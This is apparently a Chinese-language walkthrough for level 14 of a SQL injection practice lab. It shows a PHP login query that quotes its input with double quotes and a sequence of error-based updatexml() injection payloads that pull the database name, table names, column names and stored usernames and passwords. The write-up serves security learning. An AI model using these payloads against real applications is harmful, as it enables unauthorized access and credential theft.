---
title: less14
url: https://www.yuque.com/u29002979/ep2zrx/mi0osadlf96k83pm
---

```bash
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"'; 
@$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
```

与Less12的区别闭合方式为**" **&#x20;
`1"`

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"" and password="" LIMIT 0,1' at line 1

继续使用updataxml()函数

```bash
查询数据库表
-1" or updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
爆破数据表
-1" or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) -- +
爆破字段名
-1" or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users' limit 8,1),0x7e),1) -- +
爆破字段
-1" or updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users limit 0,1),0x7e),1) -- +
```
